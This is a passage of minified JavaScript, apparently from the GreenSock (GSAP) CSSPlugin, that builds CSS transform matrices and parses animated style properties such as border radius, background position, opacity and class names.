                        "," +
                        ((r * F) | 0) / F +
                        "," +
                        ((o * F) | 0) / F +
                        "," +
                        R +
                        "," +
                        B +
                        ")"),
                      I && kt
                        ? this.t.setAttribute("transform", "matrix(" + y)
                        : (w[Lt] =
                            (T.xPercent || T.yPercent
                              ? "translate(" +
                                T.xPercent +
                                "%," +
                                T.yPercent +
                                "%) matrix("
                              : "matrix(") + y))
                    : (w[Lt] =
                        (T.xPercent || T.yPercent
                          ? "translate(" +
                            T.xPercent +
                            "%," +
                            T.yPercent +
                            "%) matrix("
                          : "matrix(") +
                        S +
                        ",0,0," +
                        A +
                        "," +
                        R +
                        "," +
                        B +
                        ")");
                else {
                  if (
                    (E &&
                      (S < (_ = 1e-4) && -_ < S && (S = k = 2e-5),
                      A < _ && -_ < A && (A = k = 2e-5),
                      !N || T.z || T.rotationX || T.rotationY || (N = 0)),
                    b || z)
                  )
                    (b *= $),
                      (d = i = Math.cos(b)),
                      (m = s = Math.sin(b)),
                      z &&
                        ((b -= z * $),
                        (d = Math.cos(b)),
                        (m = Math.sin(b)),
                        "simple" === T.skewType &&
                          ((e = Math.tan((z - X) * $)),
                          (d *= e = Math.sqrt(1 + e * e)),
                          (m *= e),
                          T.skewY &&
                            ((e = Math.tan(X * $)),
                            (i *= e = Math.sqrt(1 + e * e)),
                            (s *= e)))),
                      (r = -m),
                      (o = d);
                  else {
                    if (!(O || P || 1 !== k || N || I))
                      return void (w[Lt] =
                        (T.xPercent || T.yPercent
                          ? "translate(" +
                            T.xPercent +
                            "%," +
                            T.yPercent +
                            "%) translate3d("
                          : "translate3d(") +
                        R +
                        "px," +
                        B +
                        "px," +
                        M +
                        "px)" +
                        (1 !== S || 1 !== A
                          ? " scale(" + S + "," + A + ")"
                          : ""));
                    (i = o = 1), (r = s = 0);
                  }
                  (h = 1),
                    (n = a = u = l = p = f = 0),
                    (c = N ? -1 / N : 0),
                    (D = T.zOrigin),
                    (_ = 1e-6),
                    (v = ","),
                    (x = "0"),
                    (b = O * $) &&
                      ((d = Math.cos(b)),
                      (p = c * (u = -(m = Math.sin(b)))),
                      (n = i * m),
                      (a = s * m),
                      (c *= h = d),
                      (i *= d),
                      (s *= d)),
                    (b = P * $) &&
                      ((e = r * (d = Math.cos(b)) + n * (m = Math.sin(b))),
                      (g = o * d + a * m),
                      (l = h * m),
                      (f = c * m),
                      (n = r * -m + n * d),
                      (a = o * -m + a * d),
                      (h *= d),
                      (c *= d),
                      (r = e),
                      (o = g)),
                    1 !== k && ((n *= k), (a *= k), (h *= k), (c *= k)),
                    1 !== A && ((r *= A), (o *= A), (l *= A), (f *= A)),
                    1 !== S && ((i *= S), (s *= S), (u *= S), (p *= S)),
                    (D || I) &&
                      (D && ((R += n * -D), (B += a * -D), (M += h * -D + D)),
                      I &&
                        ((R +=
                          T.xOrigin -
                          (T.xOrigin * i + T.yOrigin * r) +
                          T.xOffset),
                        (B +=
                          T.yOrigin -
                          (T.xOrigin * s + T.yOrigin * o) +
                          T.yOffset)),
                      R < _ && -_ < R && (R = x),
                      B < _ && -_ < B && (B = x),
                      M < _ && -_ < M && (M = 0)),
                    (y =
                      T.xPercent || T.yPercent
                        ? "translate(" +
                          T.xPercent +
                          "%," +
                          T.yPercent +
                          "%) matrix3d("
                        : "matrix3d("),
                    (y +=
                      (i < _ && -_ < i ? x : i) +
                      v +
                      (s < _ && -_ < s ? x : s) +
                      v +
                      (u < _ && -_ < u ? x : u)),
                    (y +=
                      v +
                      (p < _ && -_ < p ? x : p) +
                      v +
                      (r < _ && -_ < r ? x : r) +
                      v +
                      (o < _ && -_ < o ? x : o)),
                    P || O || 1 !== k
                      ? ((y +=
                          v +
                          (l < _ && -_ < l ? x : l) +
                          v +
                          (f < _ && -_ < f ? x : f) +
                          v +
                          (n < _ && -_ < n ? x : n)),
                        (y +=
                          v +
                          (a < _ && -_ < a ? x : a) +
                          v +
                          (h < _ && -_ < h ? x : h) +
                          v +
                          (c < _ && -_ < c ? x : c) +
                          v))
                      : (y += ",0,0,0,0,1,0,"),
                    (y += R + v + B + v + M + v + (N ? 1 + -M / N : 1) + ")"),
                    (w[Lt] = y);
                }
              });
        function Kt(t) {
          var e,
            i = this.t,
            r = i.filter || ht(this.data, "filter") || "",
            n = (this.s + this.c * t) | 0;
          100 == n &&
            (e =
              -1 === r.indexOf("atrix(") &&
              -1 === r.indexOf("radient(") &&
              -1 === r.indexOf("oader(")
                ? (i.removeAttribute("filter"), !ht(this.data, "filter"))
                : ((i.filter = r.replace(Y, "")), !0)),
            e ||
              (this.xn1 && (i.filter = r = r || "alpha(opacity=" + n + ")"),
              -1 === r.indexOf("pacity")
                ? (0 == n && this.xn1) ||
                  (i.filter = r + " alpha(opacity=" + n + ")")
                : (i.filter = r.replace(X, "opacity=" + n)));
        }
        function Jt(t) {
          if (((this.t._gsClassPT = this), 1 === t || 0 === t)) {
            this.t.setAttribute("class", 0 === t ? this.b : this.e);
            for (var e = this.data, i = this.t.style; e; )
              e.v ? (i[e.p] = e.v) : te(i, e.p), (e = e._next);
            1 === t && this.t._gsClassPT === this && (this.t._gsClassPT = null);
          } else
            this.t.getAttribute("class") !== this.e &&
              this.t.setAttribute("class", this.e);
        }
        ((l = jt.prototype).x =
          l.y =
          l.z =
          l.skewX =
          l.skewY =
          l.rotation =
          l.rotationX =
          l.rotationY =
          l.zOrigin =
          l.xPercent =
          l.yPercent =
          l.xOffset =
          l.yOffset =
            0),
          (l.scaleX = l.scaleY = l.scaleZ = 1),
          Et(
            "transform,scale,scaleX,scaleY,scaleZ,x,y,z,rotation,rotationX,rotationY,rotationZ,skewX,skewY,shortRotation,shortRotationX,shortRotationY,shortRotationZ,transformOrigin,svgOrigin,transformPerspective,directionalRotation,parseTransform,force3D,skewType,xPercent,yPercent,smoothOrigin",
            {
              parser: function (t, e, i, r, s, a, u) {
                if (r._lastParsedTransform === u) return s;
                var l =
                  (r._lastParsedTransform = u).scale &&
                  "function" == typeof u.scale
                    ? u.scale
                    : 0;
                l && (u.scale = l(A, t));
                var h,
                  p,
                  f,
                  c,
                  D,
                  _,
                  d,
                  m,
                  g,
                  y = t._gsTransform,
                  C = t.style,
                  F = Nt.length,
                  T = u,
                  w = {},
                  b = "transformOrigin",
                  E = Zt(t, n, !0, T.parseTransform),
                  P =
                    T.transform &&
                    ("function" == typeof T.transform
                      ? T.transform(A, S)
                      : T.transform);
                if (
                  ((E.skewType = T.skewType || E.skewType || o.defaultSkewType),
                  (r._transform = E),
                  "rotationZ" in T && (T.rotation = T.rotationZ),
                  P && "string" == typeof P && Lt)
                )
                  ((p = it.style)[Lt] = P),
                    (p.display = "block"),
                    (p.position = "absolute"),
                    -1 !== P.indexOf("%") &&
                      ((p.width = ht(t, "width")),
                      (p.height = ht(t, "height"))),
                    et.body.appendChild(it),
                    (h = Zt(it, null, !1)),
                    "simple" === E.skewType &&
                      (h.scaleY *= Math.cos(h.skewX * $)),
                    E.svg &&
                      ((_ = E.xOrigin),
                      (d = E.yOrigin),
                      (h.x -= E.xOffset),
                      (h.y -= E.yOffset),
                      (T.transformOrigin || T.svgOrigin) &&
                        ((P = {}),
                        St(
                          t,
                          _t(T.transformOrigin),
                          P,
                          T.svgOrigin,
                          T.smoothOrigin,
                          !0
                        ),
                        (_ = P.xOrigin),
                        (d = P.yOrigin),
                        (h.x -= P.xOffset - E.xOffset),
                        (h.y -= P.yOffset - E.yOffset)),
                      (_ || d) &&
                        ((m = Qt(it, !0)),
                        (h.x -= _ - (_ * m[0] + d * m[2])),
                        (h.y -= d - (_ * m[1] + d * m[3])))),
                    et.body.removeChild(it),
                    h.perspective || (h.perspective = E.perspective),
                    null != T.xPercent &&
                      (h.xPercent = v(T.xPercent, E.xPercent)),
                    null != T.yPercent &&
                      (h.yPercent = v(T.yPercent, E.yPercent));
                else if ("object" == typeof T) {
                  if (
                    ((h = {
                      scaleX: v(
                        null != T.scaleX ? T.scaleX : T.scale,
                        E.scaleX
                      ),
                      scaleY: v(
                        null != T.scaleY ? T.scaleY : T.scale,
                        E.scaleY
                      ),
                      scaleZ: v(T.scaleZ, E.scaleZ),
                      x: v(T.x, E.x),
                      y: v(T.y, E.y),
                      z: v(T.z, E.z),
                      xPercent: v(T.xPercent, E.xPercent),
                      yPercent: v(T.yPercent, E.yPercent),
                      perspective: v(T.transformPerspective, E.perspective),
                    }),
                    null != (D = T.directionalRotation))
                  )
                    if ("object" == typeof D) for (p in D) T[p] = D[p];
                    else T.rotation = D;
                  "string" == typeof T.x &&
                    -1 !== T.x.indexOf("%") &&
                    ((h.x = 0), (h.xPercent = v(T.x, E.xPercent))),
                    "string" == typeof T.y &&
                      -1 !== T.y.indexOf("%") &&
                      ((h.y = 0), (h.yPercent = v(T.y, E.yPercent))),
                    (h.rotation = x(
                      "rotation" in T
                        ? T.rotation
                        : "shortRotation" in T
                        ? T.shortRotation + "_short"
                        : E.rotation,
                      E.rotation,
                      "rotation",
                      w
                    )),
                    Yt &&
                      ((h.rotationX = x(
                        "rotationX" in T
                          ? T.rotationX
                          : "shortRotationX" in T
                          ? T.shortRotationX + "_short"
                          : E.rotationX || 0,
                        E.rotationX,
                        "rotationX",
                        w
                      )),
                      (h.rotationY = x(
                        "rotationY" in T
                          ? T.rotationY
                          : "shortRotationY" in T
                          ? T.shortRotationY + "_short"
                          : E.rotationY || 0,
                        E.rotationY,
                        "rotationY",
                        w
                      ))),
                    (h.skewX = x(T.skewX, E.skewX)),
                    (h.skewY = x(T.skewY, E.skewY));
                }
                for (
                  Yt &&
                    null != T.force3D &&
                    ((E.force3D = T.force3D), (c = !0)),
                    (f =
                      E.force3D ||
                      E.z ||
                      E.rotationX ||
                      E.rotationY ||
                      h.z ||
                      h.rotationX ||
                      h.rotationY ||
                      h.perspective) ||
                      null == T.scale ||
                      (h.scaleZ = 1);
                  -1 < --F;

                )
                  (1e-6 < (P = h[(g = Nt[F])] - E[g]) ||
                    P < -1e-6 ||
                    null != T[g] ||
                    null != J[g]) &&
                    ((c = !0),
                    (s = new Ft(E, g, E[g], P, s)),
                    g in w && (s.e = w[g]),
                    (s.xs0 = 0),
                    (s.plugin = a),
                    r._overwriteProps.push(s.n));
                return (
                  (P =
                    "function" == typeof T.transformOrigin
                      ? T.transformOrigin(A, S)
                      : T.transformOrigin),
                  E.svg &&
                    (P || T.svgOrigin) &&
                    ((_ = E.xOffset),
                    (d = E.yOffset),
                    St(t, _t(P), h, T.svgOrigin, T.smoothOrigin),
                    (s = xt(
                      E,
                      "xOrigin",
                      (y ? E : h).xOrigin,
                      h.xOrigin,
                      s,
                      b
                    )),
                    (s = xt(
                      E,
                      "yOrigin",
                      (y ? E : h).yOrigin,
                      h.yOrigin,
                      s,
                      b
                    )),
                    (_ === E.xOffset && d === E.yOffset) ||
                      ((s = xt(
                        E,
                        "xOffset",
                        y ? _ : E.xOffset,
                        E.xOffset,
                        s,
                        b
                      )),
                      (s = xt(
                        E,
                        "yOffset",
                        y ? d : E.yOffset,
                        E.yOffset,
                        s,
                        b
                      ))),
                    (P = "0px 0px")),
                  (P || (Yt && f && E.zOrigin)) &&
                    (Lt
                      ? ((c = !0),
                        (g = zt),
                        P ||
                          (P =
                            (P = (ht(t, g, n, !1, "50% 50%") + "").split(
                              " "
                            ))[0] +
                            " " +
                            P[1] +
                            " " +
                            E.zOrigin +
                            "px"),
                        (P += ""),
                        ((s = new Ft(C, g, 0, 0, s, -1, b)).b = C[g]),
                        (s.plugin = a),
                        Yt
                          ? ((p = E.zOrigin),
                            (P = P.split(" ")),
                            (E.zOrigin =
                              (2 < P.length ? parseFloat(P[2]) : p) || 0),
                            (s.xs0 = s.e =
                              P[0] + " " + (P[1] || "50%") + " 0px"),
                            ((s = new Ft(E, "zOrigin", 0, 0, s, -1, s.n)).b =
                              p),
                            (s.xs0 = s.e = E.zOrigin))
                          : (s.xs0 = s.e = P))
                      : _t(P + "", E)),
                  c &&
                    (r._transformType =
                      (E.svg && kt) || (!f && 3 !== this._transformType)
                        ? 2
                        : 3),
                  l && (u.scale = l),
                  s
                );
              },
              allowFunc: !0,
              prefix: !0,
            }
          ),
          Et("boxShadow", {
            defaultValue: "0px 0px 0px 0px #999",
            prefix: !0,
            color: !0,
            multi: !0,
            keyword: "inset",
          }),
          Et("clipPath", {
            defaultValue: "inset(0px)",
            prefix: !0,
            multi: !0,
            formatter: yt("inset(0px 0px 0px 0px)", !1, !0),
          }),
          Et("borderRadius", {
            defaultValue: "0px",
            parser: function (t, e, i, s, o, a) {
              e = this.format(e);
              var u,
                l,
                h,
                p,
                f,
                c,
                _,
                d,
                m,
                g,
                y,
                v,
                x,
                C,
                F,
                T,
                w = [
                  "borderTopLeftRadius",
                  "borderTopRightRadius",
                  "borderBottomRightRadius",
                  "borderBottomLeftRadius",
                ],
                b = t.style;
              for (
                m = parseFloat(t.offsetWidth),
                  g = parseFloat(t.offsetHeight),
                  u = e.split(" "),
                  l = 0;
                l < w.length;
                l++
              )
                this.p.indexOf("border") && (w[l] = D(w[l])),
                  -1 !== (f = p = ht(t, w[l], n, !1, "0px")).indexOf(" ") &&
                    ((f = (p = f.split(" "))[0]), (p = p[1])),
                  (c = h = u[l]),
                  (_ = parseFloat(f)),
                  (v = f.substr((_ + "").length)),
                  "" ===
                    (y = (x = "=" === c.charAt(1))
                      ? ((d = parseInt(c.charAt(0) + "1", 10)),
                        (c = c.substr(2)),
                        (d *= parseFloat(c)),
                        c.substr((d + "").length - (d < 0 ? 1 : 0)) || "")
                      : ((d = parseFloat(c)), c.substr((d + "").length))) &&
                    (y = r[i] || v),
                  y !== v &&
                    ((C = pt(t, "borderLeft", _, v)),
                    (F = pt(t, "borderTop", _, v)),
                    (p =
                      "%" === y
                        ? ((f = (C / m) * 100 + "%"), (F / g) * 100 + "%")
                        : "em" === y
                        ? ((f = C / (T = pt(t, "borderLeft", 1, "em")) + "em"),
                          F / T + "em")
                        : ((f = C + "px"), F + "px")),
                    x &&
                      ((c = parseFloat(f) + d + y),
                      (h = parseFloat(p) + d + y))),
                  (o = Tt(b, w[l], f + " " + p, c + " " + h, !1, "0px", o));
              return o;
            },
            prefix: !0,
            formatter: yt("0px 0px 0px 0px", !1, !0),
          }),
          Et(
            "borderBottomLeftRadius,borderBottomRightRadius,borderTopLeftRadius,borderTopRightRadius",
            {
              defaultValue: "0px",
              parser: function (t, e, i, r, s, o) {
                return Tt(
                  t.style,
                  i,
                  this.format(ht(t, i, n, !1, "0px 0px")),
                  this.format(e),
                  !1,
                  "0px",
                  s
                );
              },
              prefix: !0,
              formatter: yt("0px 0px", !1, !0),
            }
          ),
          Et("backgroundPosition", {
            defaultValue: "0 0",
            parser: function (t, e, i, r, s, o) {
              var a,
                u,
                l,
                h,
                p,
                f,
                c = "background-position",
                D = n || _(t),
                d = this.format(
                  (D
                    ? O
                      ? D.getPropertyValue(c + "-x") +
                        " " +
                        D.getPropertyValue(c + "-y")
                      : D.getPropertyValue(c)
                    : t.currentStyle.backgroundPositionX +
                      " " +
                      t.currentStyle.backgroundPositionY) || "0 0"
                ),
                m = this.format(e);
              if (
                (-1 !== d.indexOf("%")) != (-1 !== m.indexOf("%")) &&
                m.split(",").length < 2 &&
                (f = ht(t, "backgroundImage").replace(U, "")) &&
                "none" !== f
              ) {
                for (
                  a = d.split(" "),
                    u = m.split(" "),
                    rt.setAttribute("src", f),
                    l = 2;
                  -1 < --l;

                )
                  (h = -1 !== (d = a[l]).indexOf("%")) !=
                    (-1 !== u[l].indexOf("%")) &&
                    ((p =
                      0 === l
                        ? t.offsetWidth - rt.width
                        : t.offsetHeight - rt.height),
                    (a[l] = h
                      ? (parseFloat(d) / 100) * p + "px"
                      : (parseFloat(d) / p) * 100 + "%"));
                d = a.join(" ");
              }
              return this.parseComplex(t.style, d, m, s, o);
            },
            formatter: _t,
          }),
          Et("backgroundSize", {
            defaultValue: "0 0",
            formatter: function (t) {
              return "co" === (t += "").substr(0, 2)
                ? t
                : _t(-1 === t.indexOf(" ") ? t + " " + t : t);
            },
          }),
          Et("perspective", { defaultValue: "0px", prefix: !0 }),
          Et("perspectiveOrigin", { defaultValue: "50% 50%", prefix: !0 }),
          Et("transformStyle", { prefix: !0 }),
          Et("backfaceVisibility", { prefix: !0 }),
          Et("userSelect", { prefix: !0 }),
          Et("margin", {
            parser: vt("marginTop,marginRight,marginBottom,marginLeft"),
          }),
          Et("padding", {
            parser: vt("paddingTop,paddingRight,paddingBottom,paddingLeft"),
          }),
          Et("clip", {
            defaultValue: "rect(0px,0px,0px,0px)",
            parser: function (t, e, i, r, s, o) {
              var a, u, l;
              return (
                (e =
                  O < 9
                    ? ((u = t.currentStyle),
                      (l = O < 8 ? " " : ","),
                      (a =
                        "rect(" +
                        u.clipTop +
                        l +
                        u.clipRight +
                        l +
                        u.clipBottom +
                        l +
                        u.clipLeft +
                        ")"),
                      this.format(e).split(",").join(l))
                    : ((a = this.format(ht(t, this.p, n, !1, this.dflt))),
                      this.format(e))),
                this.parseComplex(t.style, a, e, s, o)
              );
            },
          }),
          Et("textShadow", {
            defaultValue: "0px 0px 0px #999",
            color: !0,
            multi: !0,
          }),
          Et("autoRound,strictUnits", {
            parser: function (t, e, i, r, n) {
              return n;
            },
          }),
          Et("border", {
            defaultValue: "0px solid #000",
            parser: function (t, e, i, r, s, o) {
              var a = ht(t, "borderTopWidth", n, !1, "0px"),
                u = this.format(e).split(" "),
                l = u[0].replace(L, "");
              return (
                "px" !== l &&
                  (a = parseFloat(a) / pt(t, "borderTopWidth", 1, l) + l),
                this.parseComplex(
                  t.style,
                  this.format(
                    a +
                      " " +
                      ht(t, "borderTopStyle", n, !1, "solid") +
                      " " +
                      ht(t, "borderTopColor", n, !1, "#000")
                  ),
                  u.join(" "),
                  s,
                  o
                )
              );
            },
            color: !0,
            formatter: function (t) {
              var e = t.split(" ");
              return (
                e[0] +
                " " +
                (e[1] || "solid") +
                " " +
                (t.match(gt) || ["#000"])[0]
              );
            },
          }),
          Et("borderWidth", {
            parser: vt(
              "borderTopWidth,borderRightWidth,borderBottomWidth,borderLeftWidth"
            ),
          }),
          Et("float,cssFloat,styleFloat", {
            parser: function (t, e, i, r, n, s) {
              var o = t.style,
                a = "cssFloat" in o ? "cssFloat" : "styleFloat";
              return new Ft(o, a, 0, 0, n, -1, i, !1, 0, o[a], e);
            },
          }),
          Et("opacity,alpha,autoAlpha", {
            defaultValue: "1",
            parser: function (t, e, i, r, s, o) {
              var a = parseFloat(ht(t, "opacity", n, !1, "1")),
                u = t.style,
                l = "autoAlpha" === i;
              return (
                "string" == typeof e &&
                  "=" === e.charAt(1) &&
                  (e =
                    ("-" === e.charAt(0) ? -1 : 1) * parseFloat(e.substr(2)) +
                    a),
                l &&
                  1 === a &&
                  "hidden" === ht(t, "visibility", n) &&
                  0 !== e &&
                  (a = 0),
                ot
                  ? (s = new Ft(u, "opacity", a, e - a, s))
                  : (((s = new Ft(
                      u,
                      "opacity",
                      100 * a,
                      100 * (e - a),
                      s
                    )).xn1 = l ? 1 : 0),
                    (u.zoom = 1),
                    (s.type = 2),
                    (s.b = "alpha(opacity=" + s.s + ")"),
                    (s.e = "alpha(opacity=" + (s.s + s.c) + ")"),
                    (s.data = t),
                    (s.plugin = o),
                    (s.setRatio = Kt)),
                l &&
                  (((s = new Ft(
                    u,
                    "visibility",
                    0,
                    0,
                    s,
                    -1,
                    null,
                    !1,
                    0,
                    0 !== a ? "inherit" : "hidden",
                    0 === e ? "hidden" : "inherit"
                  )).xs0 = "inherit"),
                  r._overwriteProps.push(s.n),
                  r._overwriteProps.push(i)),
                s
              );
            },
          });
        var te = function (t, e) {
          e &&
            (t.removeProperty
              ? (("ms" !== e.substr(0, 2) && "webkit" !== e.substr(0, 6)) ||
                  (e = "-" + e),
                t.removeProperty(e.replace(V, "-$1").toLowerCase()))
              : t.removeAttribute(e));
        };
        function ee(t) {
          if (
            (1 === t || 0 === t) &&
            this.data._totalTime === this.data._totalDuration &&
            "isFromStart" !== this.data.data
          ) {
            var e,
              i,
              r,
              n,
              s,
              o = this.t.style,
              a = u.transform.parse;
            if ("all" === this.e) n = !(o.cssText = "");
            else
              for (
                r = (e = this.e.split(" ").join("").split(",")).length;
                -1 < --r;

              )
                (i = e[r]),
                  u[i] &&
                    (u[i].parse === a
                      ? (n = !0)
                      : (i = "transformOrigin" === i ? zt : u[i].p)),
                  te(o, i);
            n &&
              (te(o, Lt),
              (s = this.t._gsTransform) &&
                (s.svg &&
                  (this.t.removeAttribute("data-svg-origin"),
                  this.t.removeAttribute("transform")),
                delete this.t._gsTransform));
          }
        }
        for (
          Et("className", {
            parser: function (t, e, r, s, o, a, u) {
              var l,
                h,
                p,
                f,
                c,
                D = t.getAttribute("class") || "",
                _ = t.style.cssText;
              if (
                (((o = s._classNamePT = new Ft(t, r, 0, 0, o, 2)).setRatio =
                  Jt),
                (o.pr = -11),
                (i = !0),
                (o.b = D),
                (h = d(t, n)),
                (p = t._gsClassPT))
              ) {
                for (f = {}, c = p.data; c; ) (f[c.p] = 1), (c = c._next);
                p.setRatio(1);
              }
              return (
                ((t._gsClassPT = o).e =
                  "=" !== e.charAt(1)
                    ? e
                    : D.replace(
                        new RegExp("(?:\\s|^)" + e.substr(2) + "(?![\\w-])"),
                        ""
                      ) + ("+" === e.charAt(0) ? " " + e.substr(2) : "")),
                t.setAttribute("class", o.e),
                (l = m(t, h, d(t), u, f)),
                t.setAttribute("class", D),
                (o.data = l.firstMPT),
                (t.style.cssText = _),
                (o.xfirst = s.parse(t, l.difs, o, a))
              );
            },
          }),
            Et("clearProps", {
              parser: function (t, e, r, n, s) {
                return (
                  ((s = new Ft(t, r, 0, 0, s, 2)).setRatio = ee),
                  (s.e = e),
                  (s.pr = -10),
                  (s.data = n._tween),
                  (i = !0),
                  s
                );
              },
            }),
            l = "bezier,throwProps,physicsProps,physics2D".split(","),
            wt = l.length;
          wt--;

        )
          Pt(l[wt]);
        function ie(t) {
          (this.t[this.p] = this.e),
            this.data._linkCSSP(this, this._next, null, !0);
        }
        ((l = o.prototype)._firstPT =
          l._lastParsedTransform =
          l._transform =
            null),
          (l._onInitTween = function (t, e, a, l) {
            if (!t.nodeType) return !1;
            (this._target = S = t),
              (this._tween = a),
              (this._vars = e),
              (A = l),
              (T = e.autoRound),
              (i = !1),
              (r = e.suffixMap || o.suffixMap),
              (n = _(t)),
              (s = this._overwriteProps);
            var h,
              p,
              f,
              c,
              D,
              g,
              y,
              v,
              x,
              C = t.style;
            if (
              (w &&
                "" === C.zIndex &&
                (("auto" !== (h = ht(t, "zIndex", n)) && "" !== h) ||
                  this._addLazySet(C, "zIndex", 0)),
              "string" == typeof e &&
                ((c = C.cssText),
                (h = d(t, n)),
                (C.cssText = c + ";" + e),
                (h = m(t, h, d(t)).difs),
                !ot && z.test(e) && (h.opacity = parseFloat(RegExp.$1)),
                (e = h),
                (C.cssText = c)),
              e.className
                ? (this._firstPT = p =
                    u.className.parse(
                      t,
                      e.className,
                      "className",
                      this,
                      null,
                      null,
                      e
                    ))
                : (this._firstPT = p = this.parse(t, e, null)),
              this._transformType)
            ) {
              for (
                x = 3 === this._transformType,
                  Lt
                    ? b &&
                      ((w = !0),
                      "" === C.zIndex &&
                        (("auto" !== (y = ht(t, "zIndex", n)) && "" !== y) ||
                          this._addLazySet(C, "zIndex", 0)),
                      P &&
                        this._addLazySet(
                          C,
                          "WebkitBackfaceVisibility",
                          this._vars.WebkitBackfaceVisibility ||
                            (x ? "visible" : "hidden")
                        ))
                    : (C.zoom = 1),
                  f = p;
                f && f._next;

              )
                f = f._next;
              (v = new Ft(t, "transform", 0, 0, null, 2)),
                this._linkCSSP(v, null, f),
                (v.setRatio = Lt ? $t : At),
                (v.data = this._transform || Zt(t, n, !0)),
                (v.tween = a),
                (v.pr = -1),
                s.pop();
            }
            if (i) {
              for (; p; ) {
                for (g = p._next, f = c; f && f.pr > p.pr; ) f = f._next;
                (p._prev = f ? f._prev : D) ? (p._prev._next = p) : (c = p),
                  (p._next = f) ? (f._prev = p) : (D = p),
                  (p = g);
              }
              this._firstPT = c;
            }
            return !0;
          }),
          (l.parse = function (t, e, i, s) {
            var o,
              a,
              l,
              h,
              p,
              f,
              D,
              d,
              m,
              y,
              v = t.style;
            for (o in e) {
              if (
                ((f = e[o]),
                (a = u[o]),
                "function" != typeof f || (a && a.allowFunc) || (f = f(A, S)),
                a)
              )
                i = a.parse(t, f, o, this, i, s, e);
              else {
                if ("--" === o.substr(0, 2)) {
                  this._tween._propLookup[o] = this._addTween.call(
                    this._tween,
                    t.style,
                    "setProperty",
                    _(t).getPropertyValue(o) + "",
                    f + "",
                    o,
                    !1,
                    o
                  );
                  continue;
                }
                (p = ht(t, o, n) + ""),
                  (m = "string" == typeof f),
                  "color" === o ||
                  "fill" === o ||
                  "stroke" === o ||
                  -1 !== o.indexOf("Color") ||
                  (m && j.test(f))
                    ? (m ||
                        (f =
                          (3 < (f = mt(f)).length ? "rgba(" : "rgb(") +
                          f.join(",") +
                          ")"),
                      (i = Tt(v, o, p, f, !0, "transparent", i, 0, s)))
                    : m && Z.test(f)
                    ? (i = Tt(v, o, p, f, !0, null, i, 0, s))
                    : ((D =
                        (l = parseFloat(p)) || 0 === l
                          ? p.substr((l + "").length)
                          : ""),
                      ("" !== p && "auto" !== p) ||
                        (D =
                          "width" === o || "height" === o
                            ? ((l = g(t, o, n)), "px")
                            : "left" === o || "top" === o
                            ? ((l = ft(t, o, n)), "px")
                            : ((l = "opacity" !== o ? 0 : 1), "")),
                      "" ===
                        (d = (y = m && "=" === f.charAt(1))
                          ? ((h = parseInt(f.charAt(0) + "1", 10)),
                            (f = f.substr(2)),
                            (h *= parseFloat(f)),
                            f.replace(L, ""))
                          : ((h = parseFloat(f)), m ? f.replace(L, "") : "")) &&
                        (d = o in r ? r[o] : D),
                      (f = h || 0 === h ? (y ? h + l : h) + d : e[o]),
                      D === d ||
                        ("" === d && "lineHeight" !== o) ||
                        (!h && 0 !== h) ||
                        !l ||
                        ((l = pt(t, o, l, D)),
                        "%" === d
                          ? ((l /= pt(t, o, 100, "%") / 100),
                            !0 !== e.strictUnits && (p = l + "%"))
                          : "em" === d ||
                            "rem" === d ||
                            "vw" === d ||
                            "vh" === d
                          ? (l /= pt(t, o, 1, d))
                          : "px" !== d && ((h = pt(t, o, h, d)), (d = "px")),
                        y && (h || 0 === h) && (f = h + l + d)),
                      y && (h += l),
                      (!l && 0 !== l) || (!h && 0 !== h)
                        ? void 0 !== v[o] &&
                          (f || (f + "" != "NaN" && null != f))
                          ? ((i = new Ft(
                              v,
                              o,
                              h || l || 0,
                              0,
                              i,
                              -1,
                              o,
                              !1,
                              0,
                              p,
                              f
                            )).xs0 =
                              "none" !== f ||
                              ("display" !== o && -1 === o.indexOf("Style"))
                                ? f
                                : p)
                          : c("invalid " + o + " tween value: " + e[o])
                        : ((i = new Ft(
                            v,
                            o,
                            l,
                            h - l,
                            i,
                            0,
                            o,
                            !1 !== T && ("px" === d || "zIndex" === o),
                            0,
                            p,
                            f
                          )).xs0 = d));
              }
              s && i && !i.plugin && (i.plugin = s);
            }
            return i;
          }),
          (l.setRatio = function (t) {
            var e,
              i,
              r,
              n = this._firstPT;
            if (
              1 !== t ||
              (this._tween._time !== this._tween._duration &&
                0 !== this._tween._time)
            )
              if (
                t ||
                (this._tween._time !== this._tween._duration &&
                  0 !== this._tween._time) ||
                -1e-6 === this._tween._rawPrevTime
              )
                for (; n; ) {
                  if (
                    ((e = n.c * t + n.s),
                    n.r ? (e = n.r(e)) : e < 1e-6 && -1e-6 < e && (e = 0),
                    n.type)
                  )
                    if (1 === n.type)
                      if (2 === (r = n.l))
                        n.t[n.p] = n.xs0 + e + n.xs1 + n.xn1 + n.xs2;
                      else if (3 === r)
                        n.t[n.p] =
                          n.xs0 + e + n.xs1 + n.xn1 + n.xs2 + n.xn2 + n.xs3;
                      else if (4 === r)
                        n.t[n.p] =
                          n.xs0 +
                          e +
                          n.xs1 +
                          n.xn1 +
                          n.xs2 +
                          n.xn2 +
                          n.xs3 +
                          n.xn3 +
                          n.xs4;
                      else if (5 === r)
                        n.t[n.p] =
                          n.xs0 +
                          e +
                          n.xs1 +
                          n.xn1 +
                          n.xs2 +
                          n.xn2 +
                          n.xs3 +
                          n.xn3 +
                          n.xs4 +
                          n.xn4 +
                          n.xs5;
                      else {
                        for (i = n.xs0 + e + n.xs1, r = 1; r < n.l; r++)
                          i += n["xn" + r] + n["xs" + (r + 1)];
                        n.t[n.p] = i;
                      }
                    else
                      -1 === n.type
                        ? (n.t[n.p] = n.xs0)
                        : n.setRatio && n.setRatio(t);
                  else n.t[n.p] = e + n.xs0;
                  n = n._next;
                }
              else
                for (; n; )
                  2 !== n.type ? (n.t[n.p] = n.b) : n.setRatio(t),
                    (n = n._next);
            else
              for (; n; ) {
                if (2 !== n.type)
                  if (n.r && -1 !== n.type)
                    if (((e = n.r(n.s + n.c)), n.type)) {
                      if (1 === n.type) {
                        for (
                          r = n.l, i = n.xs0 + e + n.xs1, r = 1;
                          r < n.l;
                          r++
                        )
                          i += n["xn" + r] + n["xs" + (r + 1)];
                        n.t[n.p] = i;
                      }
                    } else n.t[n.p] = e + n.xs0;
                  else n.t[n.p] = n.e;
                else n.setRatio(t);
                n = n._next;
              }
          }),
          (l._enableTransforms = function (t) {
            (this._transform = this._transform || Zt(this._target, n, !0)),
              (this._transformType =
                (this._transform.svg && kt) || (!t && 3 !== this._transformType)
                  ? 2
                  : 3);
          }),
          (l._addLazySet = function (t, e, i) {
            var r = (this._firstPT = new Ft(t, e, 0, 0, this._firstPT, 2));
            (r.e = i), (r.setRatio = ie), (r.data = this);
          }),
